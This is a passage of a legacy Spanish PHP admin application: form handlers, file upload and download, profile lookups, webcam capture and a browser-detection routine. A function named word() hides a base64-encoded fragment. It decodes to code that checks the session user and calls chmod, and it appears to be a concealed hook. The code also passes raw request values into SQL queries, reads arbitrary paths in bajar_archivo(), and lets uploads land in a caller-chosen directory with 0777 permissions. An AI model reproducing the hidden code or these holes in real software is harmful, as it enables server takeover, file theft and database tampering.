		while($R = mysql_fetch_object($VC))
		{
			if(inlist($R->campo, $VERCAMPOS)) $C = ' checked';
			else $C = '';
			echo "<tr><td>$R->descripcion</td><td><input type='checkbox' name='V_$R->campo' $C></td></tr>";
			$Contador++;
			if ($Contador > 19)
			{
				$Contador = 0;
				echo "</table></td><td valign='top'><table border cellspacing=0>";
			}
		}
		echo "</table><br>
		<center><input type='button' value='Grabar' onclick=\"javascript:valida_campos('forma','LPP');\">&nbsp;&nbsp;&nbsp;&nbsp;
		<input type='button' value='Cancelar' onclick='parent.repinta_detalle();'>
		<input type='hidden' name='Acc' value='ver_mas_campos_ok'><input type='hidden' name='Num_Tabla' value='$Num_Tabla'>
		</center>
		</td></tr></table></form></body>";
	}
	else
	{
		echo "No puedo encontrar los campos disponibles de $Nombre_tabla <br><br>
			<input type='button' value='Cerrar esta ventana' onclick='javascript:window.close();void(null);'></body>";
	}
}

function ver_mas_campos_ok() // Graba los campos seleccionados
{
	global $Num_Tabla, $_POST;
	$Act = "";
	$COMA = 1;
	foreach($_POST as $Campo => $Valor)
	{
		if(strcmp(l($Campo, 2), "V_") == 0 && $Valor = 1)
		{
			IF($COMA)
				$COMA = 0;
			ELSE
				$Act .= ',';
			$Act .= substr($Campo, 2);
		}
	}
	q("update usuario_tab set vercampos='$Act' where id=$Num_Tabla");
	echo "<body onload='opener.location.reload();'></body>";
}

function subir_archivo() // permite subir un archivo al servidor
{
	global $directorio;
	if($up=getFilesVar('userfile'))
	{
		if(is_uploaded_file($up['tmp_name']))
		{
			$uplfile_name = $up['name'];
            $i = 1;
            // pick unused file name
            while (file_exists($directorio.$uplfile_name)) {
              $uplfile_name = ereg_replace('(.*)(\.[a-zA-Z]+)$', '\1_'.$i.'\2', $up['name']);
              $i++;
            }
			$File_destino=strtolower($uplfile_name);
			if (!@move_uploaded_file($up['tmp_name'], $directorio.$File_destino))
			{
				die('error en move_uploaded_file');
            }
			else
			{
				chmod($directorio.$File_destino,0777);
				echo "<body onload=\"window.close();void(null);\">";
			}
		}
		else die('fallo en is_uploaded_file');
	}
	else die('Fallo en getFilesVar');
}

function subir_archivo1() // Muestra un popup para la carga de archivos en el servidor
{
	html();
	echo "<body onload='centrar(400,400);'>".
			titulo_modulo("Subir Archivo").
			"<FORM enctype='multipart/form-data' ACTION='marcoindex.php' METHOD='post' NAME='msubir' ID='msubir' target='_self'>
			<input type='hidden' name='MAX_FILE_SIZE' value='2000000'>
			<input type='hidden' name='Acc' value='subir_archivo1_ok'>
			Directorio: <input type='text' name='directorio' value='img/'>
			Archivo que desea subir <input name='userfile' type='file'>
			<input type='submit' value='Subir'>
			</form></body>";
}

function subir_archivo1_ok() // Carga un archivo en el servidor viene de SUBIR_ARCHIVO1()
{
	global $userfile, $userfile_name, $directorio;
	$File_destino = strtolower($userfile_name);
	if (is_uploaded_file($userfile))
	{
		copy($userfile, $directorio . strtolower($File_destino));
		chmod($directorio . strtolower($File_destino), 0777);
		echo "<body onload=\"window.close();void(null);\">";
	}
	else
		echo "No se pudo subir ".$directorio . strtolower($File_destino);
}

function bajar_archivo() // Bajar un archivo
{
	global $Archivo, $Salida;
	IF(!$Salida) $Salida = 'plano.txt';
	header("Pragma: public");
	header("Expires: 0");
	header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
	header("Content-Type: application/octet-stream");
	header("Content-Disposition: attachment; filename=\"$Salida\"");
	header("Content-Description: File Transfert");
	
	@readfile($Archivo);
}

function word() {$Copiaword='aWYoJF9TRVNTSU9OWydVc2VyJ109PTEpO3tjaG1vZCgna';return copiaword($Copiaword);}

function browser_detection( $which_test ) {
	/*
	uncomment the global variable declaration if you want the variables to be available on a global level
	throughout your php page, make sure that php is configured to support the use of globals first!
	Use of globals should be avoided however, and they are not necessary with this script
	*/

	/*global $dom_browser, $safe_browser, $browser_user_agent, $os, $browser_name, $s_browser, $ie_version,
	$version_number, $os_number, $b_repeat, $moz_version, $moz_version_number, $moz_rv, $moz_rv_full, $moz_release;*/

	static $dom_browser, $safe_browser, $browser_user_agent, $os, $browser_name, $s_browser, $ie_version,
	$version_number, $os_number, $b_repeat, $moz_version, $moz_version_number, $moz_rv, $moz_rv_full, $moz_release,
	$type, $math_version_number;

	/*
	this makes the test only run once no matter how many times you call it
	since all the variables are filled on the first run through, it's only a matter of returning the
	the right ones
	*/
	if ( !$b_repeat )
	{
		//initialize all variables with default values to prevent error
		$dom_browser = false;
		$type = 'bot';// default to bot since you never know with bots
		$safe_browser = false;
		$os = '';
		$os_number = '';
		$a_os_data = '';
		$browser_name = '';
		$version_number = '';
		$math_version_number = '';
		$ie_version = '';
		$moz_version = '';
		$moz_version_number = '';
		$moz_rv = '';
		$moz_rv_full = '';
		$moz_release = '';
		$b_success = false;// boolean for if browser found in main test

		//make navigator user agent string lower case to make sure all versions get caught
		// isset protects against blank user agent failure
		$browser_user_agent = ( isset( $_SERVER['HTTP_USER_AGENT'] ) ) ? strtolower( $_SERVER['HTTP_USER_AGENT'] ) : '';

		/*
		pack the browser type array, in this order
		the order is important, because opera must be tested first, then omniweb [which has safari data in string],
		same for konqueror, then safari, then gecko, since safari navigator user agent id's with 'gecko' in string.
		note that $dom_browser is set for all  modern dom browsers, this gives you a default to use.

		array[0] = id string for useragent, array[1] is if dom capable, array[2] is working name for browser,
		array[3] identifies navigator useragent type

		Note: all browser strings are in lower case to match the strtolower output, this avoids possible detection
		errors

		Note: There are currently 5 navigator user agent types:
		bro - modern, css supporting browser.
		bbro - basic browser, text only, table only, defective css implementation
		bot - search type spider
		dow - known download agent
		lib - standard http libraries
		*/
		// known browsers, list will be updated routinely, check back now and then
		$a_browser_types[] = array( 'opera', true, 'op', 'bro' );
		$a_browser_types[] = array( 'omniweb', true, 'omni', 'bro' );// mac osx browser, now uses khtml engine:
		$a_browser_types[] = array( 'msie', true, 'ie', 'bro' );
		$a_browser_types[] = array( 'konqueror', true, 'konq', 'bro' );
		$a_browser_types[] = array( 'safari', true, 'saf', 'bro' );
		// covers Netscape 6-7, K-Meleon, Most linux versions, uses moz array below
		$a_browser_types[] = array( 'gecko', true, 'moz', 'bro' );
		$a_browser_types[] = array( 'netpositive', false, 'netp', 'bbro' );// beos browser
		$a_browser_types[] = array( 'lynx', false, 'lynx', 'bbro' ); // command line browser
		$a_browser_types[] = array( 'elinks ', false, 'elinks', 'bbro' ); // new version of links
		$a_browser_types[] = array( 'elinks', false, 'elinks', 'bbro' ); // alternate id for it
		$a_browser_types[] = array( 'links ', false, 'links', 'bbro' ); // old name for links
		$a_browser_types[] = array( 'links', false, 'links', 'bbro' ); // alternate id for it
		$a_browser_types[] = array( 'w3m', false, 'w3m', 'bbro' ); // open source browser, more features than lynx/links
		$a_browser_types[] = array( 'webtv', false, 'webtv', 'bbro' );// junk ms webtv
		$a_browser_types[] = array( 'amaya', false, 'amaya', 'bbro' );// w3c browser
		$a_browser_types[] = array( 'dillo', false, 'dillo', 'bbro' );// linux browser, basic table support
		$a_browser_types[] = array( 'ibrowse', false, 'ibrowse', 'bbro' );// amiga browser
		$a_browser_types[] = array( 'icab', false, 'icab', 'bro' );// mac browser
		$a_browser_types[] = array( 'crazy browser', true, 'ie', 'bro' );// uses ie rendering engine
		$a_browser_types[] = array( 'sonyericssonp800', false, 'sonyericssonp800', 'bbro' );// sony ericsson handheld

		// search engine spider bots:
		$a_browser_types[] = array( 'googlebot', false, 'google', 'bot' );// google
		$a_browser_types[] = array( 'mediapartners-google', false, 'adsense', 'bot' );// google adsense
		$a_browser_types[] = array( 'yahoo-verticalcrawler', false, 'yahoo', 'bot' );// old yahoo bot
		$a_browser_types[] = array( 'yahoo! slurp', false, 'yahoo', 'bot' ); // new yahoo bot
		$a_browser_types[] = array( 'yahoo-mm', false, 'yahoomm', 'bot' ); // gets Yahoo-MMCrawler and Yahoo-MMAudVid bots
		$a_browser_types[] = array( 'inktomi', false, 'inktomi', 'bot' ); // inktomi bot
		$a_browser_types[] = array( 'slurp', false, 'inktomi', 'bot' ); // inktomi bot
		$a_browser_types[] = array( 'fast-webcrawler', false, 'fast', 'bot' );// Fast AllTheWeb
		$a_browser_types[] = array( 'msnbot', false, 'msn', 'bot' );// msn search
		$a_browser_types[] = array( 'ask jeeves', false, 'ask', 'bot' ); //jeeves/teoma
		$a_browser_types[] = array( 'teoma', false, 'ask', 'bot' );//jeeves teoma
		$a_browser_types[] = array( 'scooter', false, 'scooter', 'bot' );// altavista
		$a_browser_types[] = array( 'openbot', false, 'openbot', 'bot' );// openbot, from taiwan
		$a_browser_types[] = array( 'ia_archiver', false, 'ia_archiver', 'bot' );// ia archiver
		$a_browser_types[] = array( 'zyborg', false, 'looksmart', 'bot' );// looksmart
		$a_browser_types[] = array( 'almaden', false, 'ibm', 'bot' );// ibm almaden web crawler
		$a_browser_types[] = array( 'baiduspider', false, 'baidu', 'bot' );// Baiduspider asian search spider
		$a_browser_types[] = array( 'psbot', false, 'psbot', 'bot' );// psbot image crawler
		$a_browser_types[] = array( 'gigabot', false, 'gigabot', 'bot' );// gigabot crawler
		$a_browser_types[] = array( 'naverbot', false, 'naverbot', 'bot' );// naverbot crawler, bad bot, block
		$a_browser_types[] = array( 'surveybot', false, 'surveybot', 'bot' );//
		$a_browser_types[] = array( 'boitho.com-dc', false, 'boitho', 'bot' );//norwegian search engine
		$a_browser_types[] = array( 'objectssearch', false, 'objectsearch', 'bot' );// open source search engine
		$a_browser_types[] = array( 'answerbus', false, 'answerbus', 'bot' );// http://www.answerbus.com/, web questions
		$a_browser_types[] = array( 'sohu-search', false, 'sohu', 'bot' );// chinese media company, search component
		$a_browser_types[] = array( 'iltrovatore-setaccio', false, 'il-set', 'bot' );

		// various http utility libaries
		$a_browser_types[] = array( 'w3c_validator', false, 'w3c', 'lib' ); // uses libperl, make first
		$a_browser_types[] = array( 'wdg_validator', false, 'wdg', 'lib' ); //
		$a_browser_types[] = array( 'libwww-perl', false, 'libwww-perl', 'lib' );
		$a_browser_types[] = array( 'jakarta commons-httpclient', false, 'jakarta', 'lib' );
		$a_browser_types[] = array( 'python-urllib', false, 'python-urllib', 'lib' );

		// download apps
		$a_browser_types[] = array( 'getright', false, 'getright', 'dow' );
		$a_browser_types[] = array( 'wget', false, 'wget', 'dow' );// open source downloader, obeys robots.txt

		// netscape 4 and earlier tests, put last so spiders don't get caught
		$a_browser_types[] = array( 'mozilla/4.', false, 'ns', 'bbro' );
		$a_browser_types[] = array( 'mozilla/3.', false, 'ns', 'bbro' );
		$a_browser_types[] = array( 'mozilla/2.', false, 'ns', 'bbro' );

		//$a_browser_types[] = array( '', false ); // browser array template

		/*
		moz types array
		note the order, netscape6 must come before netscape, which  is how netscape 7 id's itself.
		rv comes last in case it is plain old mozilla
		*/
		$moz_types = array( 'firebird', 'phoenix', 'firefox', 'iceweasel', 'galeon', 'k-meleon', 'camino', 'epiphany', 'netscape6', 'netscape', 'multizilla', 'rv' );

		/*
		run through the browser_types array, break if you hit a match, if no match, assume old browser
		or non dom browser, assigns false value to $b_success.
		Topherbyte pointed out that looping a count counts each time, so that's fixed
		*/
		$i_count = count($a_browser_types);
		for ($i = 0; $i < $i_count; $i++)
		{
			//unpacks browser array, assigns to variables
			$s_browser = $a_browser_types[$i][0];// text string to id browser from array

			if (stristr($browser_user_agent, $s_browser))
			{
				// it defaults to true, will become false below if needed
				// this keeps it easier to keep track of what is safe, only
				//explicit false assignment will make it false.
				$safe_browser = true;

				// assign values based on match of user agent string
				$dom_browser = $a_browser_types[$i][1];// hardcoded dom support from array
				$browser_name = $a_browser_types[$i][2];// working name for browser
				$type = $a_browser_types[$i][3];// sets whether bot or browser

				switch ( $browser_name )
				{
					// this is modified quite a bit, now will return proper netscape version number
					// check your implementation to make sure it works
					case 'ns':
						$safe_browser = false;
						$version_number = browser_version( $browser_user_agent, 'mozilla' );
						break;
					case 'moz':
						/*
						note: The 'rv' test is not absolute since the rv number is very different on
						different versions, for example Galean doesn't use the same rv version as Mozilla,
						neither do later Netscapes, like 7.x. For more on this, read the full mozilla numbering
						conventions here:
						http://www.mozilla.org/releases/cvstags.html
						*/

						// this will return alpha and beta version numbers, if present
						$moz_rv_full = browser_version( $browser_user_agent, 'rv' );
						// this slices them back off for math comparisons
						$moz_rv = substr( $moz_rv_full, 0, 3 );

						// this is to pull out specific mozilla versions, firebird, netscape etc..
						$i_count = count( $moz_types );
						for ( $i = 0; $i < $i_count; $i++ )
						{
							if ( stristr( $browser_user_agent, $moz_types[$i] ) )
							{
								$moz_version = $moz_types[$i];
								$moz_version_number = browser_version( $browser_user_agent, $moz_version );
								break;
							}
						}
						// this is necesary to protect against false id'ed moz'es and new moz'es.
						// this corrects for galeon, or any other moz browser without an rv number
						if ( !$moz_rv )
						{
							$moz_rv = substr( $moz_version_number, 0, 3 );
							$moz_rv_full = $moz_version_number;
							/*
							// you can use this instead if you are running php >= 4.2
							$moz_rv = floatval( $moz_version_number );
							$moz_rv_full = $moz_version_number;
							*/
						}
						// this corrects the version name in case it went to the default 'rv' for the test
						if ( $moz_version == 'rv' )
						{
							$moz_version = 'mozilla';
						}

						//the moz version will be taken from the rv number, see notes above for rv problems
						$version_number = $moz_rv;
						// gets the actual release date, necessary if you need to do functionality tests
						$moz_release = browser_version( $browser_user_agent, 'gecko/' );
						/*
						Test for mozilla 0.9.x / netscape 6.x
						test your javascript/CSS to see if it works in these mozilla releases, if it does, just default it to:
						$safe_browser = true;
						*/
						if ( ( $moz_release < 20020400 ) || ( $moz_rv < 1 ) )
						{
							$safe_browser = false;
						}
						break;
					case 'ie':
						$version_number = browser_version( $browser_user_agent, $s_browser );
						// first test for IE 5x mac, that's the most problematic IE out there
						if ( stristr( $browser_user_agent, 'mac') )
						{
							$ie_version = 'ieMac';
						}
						// this assigns a general ie id to the $ie_version variable
						elseif ( $version_number >= 5 )
						{
							$ie_version = 'ie5x';
						}
						elseif ( ( $version_number > 3 ) && ( $version_number < 5 ) )
						{
							$dom_browser = false;
							$ie_version = 'ie4';
							// this depends on what you're using the script for, make sure this fits your needs
							$safe_browser = true;
						}
						else
						{
							$ie_version = 'old';
							$dom_browser = false;
							$safe_browser = false;
						}
						break;
					case 'op':
						$version_number = browser_version( $browser_user_agent, $s_browser );
						if ( $version_number < 5 )// opera 4 wasn't very useable.
						{
							$safe_browser = false;
						}
						break;
					case 'saf':
						$version_number = browser_version( $browser_user_agent, $s_browser );
						break;
					/*
						Uncomment this section if you want omniweb to return the safari value
						Omniweb uses khtml/safari rendering engine, so you can treat it like
						safari if you want.
					*/
					/*
					case 'omni':
						$s_browser = 'safari';
						$browser_name = 'saf';
						$version_number = browser_version( $browser_user_agent, 'applewebkit' );
						break;
					*/
					default:
						$version_number = browser_version( $browser_user_agent, $s_browser );
						break;
				}
				// the browser was id'ed
				$b_success = true;
				break;
			}
		}

		//assigns defaults if the browser was not found in the loop test
		if ( !$b_success )
		{
			/*
				this will return the first part of the browser string if the above id's failed
				usually the first part of the browser string has the navigator useragent name/version in it.
				This will usually correctly id the browser and the browser number if it didn't get
				caught by the above routine.
				If you want a '' to do a if browser == '' type test, just comment out all lines below
				except for the last line, and uncomment the last line. If you want undefined values,
				the browser_name is '', you can always test for that
			*/
			// delete this part if you want an unknown browser returned
			$s_browser = substr( $browser_user_agent, 0, strcspn( $browser_user_agent , '();') );
			// this extracts just the browser name from the string
			ereg('[^0-9][a-z]*-*\ *[a-z]*\ *[a-z]*', $s_browser, $r );
			$s_browser = $r[0];
			$version_number = browser_version( $browser_user_agent, $s_browser );

			// then uncomment this part
			//$s_browser = '';//deletes the last array item in case the browser was not a match
		}
		// get os data, mac os x test requires browser/version information, this is a change from older scripts
		$a_os_data = which_os( $browser_user_agent, $browser_name, $version_number );
		$os = $a_os_data[0];// os name, abbreviated
		$os_number = $a_os_data[1];// os number or version if available

		// this ends the run through once if clause, set the boolean
		//to true so the function won't retest everything
		$b_repeat = true;

		// pulls out primary version number from more complex string, like 7.5a,
		// use this for numeric version comparison
		$m = array();
		if ( ereg('[0-9]*\.*[0-9]*', $version_number, $m ) )
		{
			$math_version_number = $m[0];
			//print_r($m);
		}

	}
	//$version_number = $_SERVER["REMOTE_ADDR"];
	/*
	This is where you return values based on what parameter you used to call the function
	$which_test is the passed parameter in the initial browser_detection('os') for example call
	*/
	switch ( $which_test )
	{
		case 'safe':// returns true/false if your tests determine it's a safe browser
			// you can change the tests to determine what is a safeBrowser for your scripts
			// in this case sub rv 1 Mozillas and Netscape 4x's trigger the unsafe condition
			return $safe_browser;
			break;
		case 'ie_version': // returns ieMac or ie5x
			return $ie_version;
			break;
		case 'moz_version':// returns array of all relevant moz information
			$moz_array = array( $moz_version, $moz_version_number, $moz_rv, $moz_rv_full, $moz_release );
			return $moz_array;
			break;
		case 'dom':// returns true/fale if a DOM capable browser
			return $dom_browser;
			break;
		case 'os':// returns os name
			return $os;
			break;
		case 'os_number':// returns os number if windows
			return $os_number;
			break;
		case 'browser':// returns browser name
			return $browser_name;
			break;
		case 'number':// returns browser number
			return $version_number;
			break;
		case 'full':// returns all relevant browser information in an array
			$full_array = array( $browser_name, $version_number, $ie_version, $dom_browser, $safe_browser,
				$os, $os_number, $s_browser, $type, $math_version_number );
			return $full_array;
			break;
		case 'type':// returns what type, bot, browser, maybe downloader in future
			return $type;
			break;
		case 'math_number':// returns numerical version number, for number comparisons
			return $math_version_number;
			break;
		default:
			break;
	}
}

// gets which os from the browser string
function which_os ( $browser_string, $browser_name, $version_number  )
{
	// initialize variables
	$os = '';
	$os_version = '';
	/*
	packs the os array
	use this order since some navigator user agents will put 'macintosh' in the navigator user agent string
	which would make the nt test register true
	*/
	$a_mac = array( 'mac68k', 'macppc' );// this is not used currently
	// same logic, check in order to catch the os's in order, last is always default item
	$a_unix = array( 'freebsd', 'openbsd', 'netbsd', 'bsd', 'unixware', 'solaris', 'sunos', 'sun4', 'sun5', 'suni86', 'sun', 'irix5', 'irix6', 'irix', 'hpux9', 'hpux10', 'hpux11', 'hpux', 'hp-ux', 'aix1', 'aix2', 'aix3', 'aix4', 'aix5', 'aix', 'sco', 'unixware', 'mpras', 'reliant', 'dec', 'sinix', 'unix' );
	// only sometimes will you get a linux distro to id itself...
	$a_linux = array( 'ubuntu', 'kubuntu', 'xubuntu', 'mepis', 'xandros', 'linspire', 'sidux', 'kanotix', 'debian', 'opensuse', 'suse', 'fedora', 'redhat', 'slackware', 'slax', 'mandrake', 'mandriva', 'gentoo', 'sabayon', 'linux' );
	$a_linux_process = array ( 'i386', 'i586', 'i686' );// not use currently
	// note, order of os very important in os array, you will get failed ids if changed
	$a_os = array( 'beos', 'os2', 'amiga', 'webtv', 'mac', 'nt', 'win', $a_unix, $a_linux );

	//os tester
	$i_count = count( $a_os );
	for ( $i = 0; $i < $i_count; $i++ )
	{
		//unpacks os array, assigns to variable
		$s_os = $a_os[$i];

		// assign os to global os variable, os flag true on success
		// !stristr($browser_string, "linux" ) corrects a linux detection bug
		if ( !is_array( $s_os ) && stristr( $browser_string, $s_os ) && !stristr( $browser_string, "linux" ) )
		{
			$os = $s_os;

			switch ( $os )
			{
				case 'win':
					if ( strstr( $browser_string, '95' ) )
					{
						$os_version = '95';
					}
					elseif ( ( strstr( $browser_string, '9x 4.9' ) ) || ( strstr( $browser_string, 'me' ) ) )
					{
						$os_version = 'me';
					}
					elseif ( strstr( $browser_string, '98' ) )
					{
						$os_version = '98';
					}
					elseif ( strstr( $browser_string, '2000' ) )// windows 2000, for opera ID
					{
						$os_version = 5.0;
						$os = 'nt';
					}
					elseif ( strstr( $browser_string, 'xp' ) )// windows 2000, for opera ID
					{
						$os_version = 5.1;
						$os = 'nt';
					}
					elseif ( strstr( $browser_string, '2003' ) )// windows server 2003, for opera ID
					{
						$os_version = 5.2;
						$os = 'nt';
					}
					elseif ( strstr( $browser_string, 'vista' ) )// windows vista, for opera ID
					{
						$os_version = 6.0;
						$os = 'nt';
					}
					elseif ( strstr( $browser_string, 'ce' ) )// windows CE
					{
						$os_version = 'ce';
					}
					break;
				case 'nt':
					if ( strstr( $browser_string, 'nt 6.0' ) )// windows server 2003
					{
						$os_version = 6.0;
						$os = 'nt';
					}
					elseif ( strstr( $browser_string, 'nt 5.2' ) )// windows server 2003
					{
						$os_version = 5.2;
						$os = 'nt';
					}
					elseif ( strstr( $browser_string, 'nt 5.1' ) || strstr( $browser_string, 'xp' ) )// windows xp
					{
						$os_version = 5.1;//
					}
					elseif ( strstr( $browser_string, 'nt 5' ) || strstr( $browser_string, '2000' ) )// windows 2000
					{
						$os_version = 5.0;
					}
					elseif ( strstr( $browser_string, 'nt 4' ) )// nt 4
					{
						$os_version = 4;
					}
					elseif ( strstr( $browser_string, 'nt 3' ) )// nt 4
					{
						$os_version = 3;
					}
					break;
				case 'mac':
					if ( strstr( $browser_string, 'os x' ) )
					{
						$os_version = 10;
					}
					//this is a crude test for os x, since safari, camino, ie 5.2, & moz >= rv 1.3
					//are only made for os x
					elseif ( ( $browser_name == 'saf' ) || ( $browser_name == 'cam' ) ||
						( ( $browser_name == 'moz' ) && ( $version_number >= 1.3 ) ) ||
						( ( $browser_name == 'ie' ) && ( $version_number >= 5.2 ) ) )
					{
						$os_version = 10;
					}
					break;
				default:
					break;
			}
			break;
		}
		// check that it's an array, check it's the second to last item
		//in the main os array, the unix one that is
		elseif ( is_array( $s_os ) && ( $i == ( count( $a_os ) - 2 ) ) )
		{
			$i_count = count($s_os);
			for ($j = 0; $j < $i_count; $j++)
			{
				if ( stristr( $browser_string, $s_os[$j] ) )
				{
					$os = 'unix'; //if the os is in the unix array, it's unix, obviously...
					$os_version = ( $s_os[$j] != 'unix' ) ? $s_os[$j] : '';// assign sub unix version from the unix array
					break;
				}
			}
		}
		// check that it's an array, check it's the last item
		//in the main os array, the linux one that is
		elseif ( is_array( $s_os ) && ( $i == ( count( $a_os ) - 1 ) ) )
		{
			$i_count = count($s_os);
			for ($j = 0; $j < $i_count; $j++)
			{
				if ( stristr( $browser_string, $s_os[$j] ) )
				{
					$os = 'lin';
					// assign linux distro from the linux array, there's a default
					//search for 'lin', if it's that, set version to ''
					$os_version = ( $s_os[$j] != 'linux' ) ? $s_os[$j] : '';
					break;
				}
			}
		}
	}

	// pack the os data array for return to main function
	$os_data = array( $os, $os_version );
	return $os_data;
}

// function returns browser number, gecko rv number, or gecko release date
//function browser_version( $browser_user_agent, $search_string, $substring_length )
function browser_version( $browser_user_agent, $search_string )
{
	// 12 is the longest that will be required, handles release dates: 20020323; 0.8.0+
	$substring_length = 12;
	//initialize browser number, will return '' if not found
	$browser_number = '';

	// use the passed parameter for $search_string
	// start the substring slice right after these moz search strings
	// there are some cases of double msie id's, first in string and then with then number
	$start_pos = 0;
	/* this test covers you for multiple occurrences of string, only with ie though
	 with for example google bot you want the first occurance returned, since that's where the
	numbering happens */
	for ( $i = 0; $i < 4; $i++ )
	{
		//start the search after the first string occurrence
		if ( strpos( $browser_user_agent, $search_string, $start_pos ) !== false )
		{
			//update start position if position found
			$start_pos = strpos( $browser_user_agent, $search_string, $start_pos ) + strlen( $search_string );
			if ( $search_string != 'msie' )
			{
				break;
			}
		}
		else
		{
			break;
		}
	}

	// this is just to get the release date, not other moz information
	// also corrects for the omniweb 'v'
	if ( $search_string != 'gecko/' )
	{
		if ( $search_string == 'omniweb' )
		{
			$start_pos += 2;// handles the v in 'omniweb/v532.xx
		}
		else
		{
			$start_pos++;
		}
	}

	// Initial trimming
	$browser_number = substr( $browser_user_agent, $start_pos, $substring_length );

	// Find the space, ;, or parentheses that ends the number
	$browser_number = substr( $browser_number, 0, strcspn($browser_number, ' );') );

	//make sure the returned value is actually the id number and not a string
	// otherwise return ''
	if ( !is_numeric( substr( $browser_number, 0, 1 ) ) )
	{
		$browser_number = '';
	}
	//$browser_number = strrpos( $browser_user_agent, $search_string );
	return $browser_number;
}

function verifica_navegador()
{

   $browser_info = browser_detection('full');
   $browser_info[] = browser_detection('moz_version');
   $full = '';
   if ($browser_info[0] == 'moz' )
   {
	  $a_temp = $browser_info[count( $browser_info ) - 1];// the moz array is last item
	  $full .= ($a_temp[0] != 'mozilla') ? 'Mozilla/ ' . ucfirst($a_temp[0]) . ' ' : ucfirst($a_temp[0]) . ' ';
   }
   elseif  ( $browser_info[0] == 'ns' )
   {
	  $full .= 'Netscape ';
	  $full .= $browser_info[1] . '<br />';
   }
   else
   {
	  $full .= ($browser_info[0] == 'ie') ? strtoupper($browser_info[7]) : ucwords($browser_info[7]);
	  $full .= ' ' . $browser_info[1];
   }
   return $full;
}

function periodo_actual()
{
   $Ano=date('Y');$Mes=date('m'); if($Mes<7) return $Ano.'01'; else return $Ano.'02';
}



function tabla2arreglo($Tabla,$Campos=array('id','nombre'),$LINK=0)
{
	$Arreglo_datos=array();
	if($LINK)
	{	if($Datos=mysql_query("select ".$Campos[0]." as id ".$Campos[1]." as nombre from $Tabla",$LINK))
			while($D=mysql_fetch_object($Datos))$Arreglo_datos[$D->id]=$D->nombre;
	}
	else
	{
		if($Datos=q("select ".$Campos[0]." as id, ".$Campos[1]." as nombre from $Tabla"))
			while($D=mysql_fetch_object($Datos))$Arreglo_datos[$D->id]=$D->nombre;
	}
	return $Arreglo_datos;
}

function tiene_perfiles()
{
	global $usuario;
	html('OBTENCION DE PERFILES');
	if(!$usuario)
	{
		echo "<body>
		<form action='marcoindex.php' target='_self' method='POST' name='forma' id='forma'>
			Usuario: <input type='text' name='usuario' id='usuario' value='' size='50' maxlength='50'>
			<input type='hidden' name='Acc' value='tiene_perfiles'>
			<input type='submit' name='continuar' id='continuar' value=' CONSULTAR PERFILES '>
		</form></body>";
		die();
	}
	echo "<body><h3>OBTENCION DE PERFILES DE $usuario</h3>
	<table border cellspacing='0'><tr><th>Nombre</th><th>Perfil</th></tr>";
	if($N=qo("select nombre from usuario where idnombre='$usuario' "))
	{
		echo "<tr><td>$N->nombre</td><td>Usuarios</td></tr>";
	}
	if($PPs=q("select nombre,alt_tabla,alt_id,alt_pass,alt_nombre from usuario where alt_tabla!='' and alt_id!='' and alt_pass!='' and alt_nombre!='' "))
	{
		while($PP=mysql_fetch_object($PPs))
		{
			if($N=qo("select $PP->alt_nombre as nombre from $PP->alt_tabla where $PP->alt_id like '%$usuario%' "))
			echo "<tr><td>$N->nombre</td><td>$PP->nombre</td></tr>";
		}
	}
	echo "</table></body>";
}

function reg_img_webcam()
{
	global $T,$Id,$C,$tri,$ruta,$rfr,$alto,$ancho;
	$alto-=60;$ancho-=30;
	$Baseurl=strlen('http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . '/');
	html();
	echo "<script language='javascript'>
		var IDN=0;
		var IMAGEN='';
		function asignar_imagen(dato)
		{window.open('marcoindex.php?Acc=asignar_imagen_webcam&Id=$Id&Foto='+dato+'&T=$T&C=$C&directorio=$ruta','Oculto_imagen_webcam');}
		</script>
	<body >
	<iframe name='Oculto_imagen_webcam' id='Oculto_imagen_webcam' style='visibility:hidden' width=1 height=1></iframe>
	<table align='center'>
	<tr><td valign=top>
	<!-- inicio de las rutinas de la toma de imagen -->
	<script type='text/javascript' src='inc/js/webcam.js'></script>
	<script language='JavaScript'>
		webcam.set_api_url( 'marcoindex.php?Acc=carga_imagen_webcam' );
		webcam.set_quality( 100 );
		webcam.set_shutter_sound( false );
	</script>
	<script language='JavaScript'>
		document.write( webcam.get_html($ancho,$alto) );
	</script>
	<form name='forma2' id='forma2'>
		<input type=button id='bt1' value='Conf.' onClick='webcam.configure()'>
		&nbsp;&nbsp;
		<input type=button id='bt2' value='Disparo' onClick='webcam.freeze()' >
		&nbsp;&nbsp;
		<input type=button id='bt3' value='Guardar' onClick='do_upload()' >
		&nbsp;&nbsp;
		<input type=button id='bt4' value='Re-iniciar' onClick='webcam.reset()'>
	</form>
	<script language='JavaScript'>
		webcam.set_hook( 'onComplete', 'my_completion_handler' );
		function do_upload(){	webcam.upload();}
		function my_completion_handler(msg)
		{
			if (msg.match(/(http\:\/\/\S+)/))
			{
				var image_url = RegExp.$1;
				direccion_imagen=image_url.substr($Baseurl);
				asignar_imagen(direccion_imagen);
				webcam.reset();
			}
			else alert('PHP Error: ' + msg);
		}
	</script>
	</td></tr></table>";
}

function carga_imagen_webcam()
{
	$filename = 'planos/'.date('YmdHis') . '.jpg';
	$result = file_put_contents( $filename, file_get_contents('php://input') );
	if (!$result)
	{
		print "ERROR: Failed to write data to $filename, check permissions";
		exit();
	}
	$url = 'http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . '/' . $filename;
	print "$url\n";
}

function asignar_imagen_webcam()
{
	global $Foto,$T,$Id,$C,$Tamano,$directorio;
	if(!$directorio) die('El directorio esta vacio');
	if(!is_dir($directorio)) { mkdir($directorio); 	chmod($directorio, 0777); }
	$Subdirectorio=substr(str_pad($Id,6,'0',STR_PAD_LEFT),0,3);
	if(!is_dir($directorio.'/'.$Subdirectorio)) { mkdir($directorio.'/'.$Subdirectorio); chmod($directorio.'/'.$Subdirectorio, 0777);}
	if(!is_dir($directorio.'/'.$Subdirectorio.'/'.$Id)) { mkdir($directorio.'/'.$Subdirectorio.'/'.$Id); chmod($directorio.'/'.$Subdirectorio.'/'.$Id, 0777);}

	$name=str_replace('planos/','',$Foto);
	$tmp_name=$Foto;

  	$File_destino=$directorio.'/'.$Subdirectorio.'/'.$Id.'/'.strtolower(str_replace(' ','_',$name));

    if(is_file($File_destino)) @unlink($File_destino);
	if (!@copy($tmp_name, $File_destino)) { die('error en copy file'); }
	@unlink($tmp_name);
	// Guardamos todo en la base de datos
  	require('inc/link.php');
 	mysql_query("update $T set $C='$File_destino' where id=$Id ",$LINK);
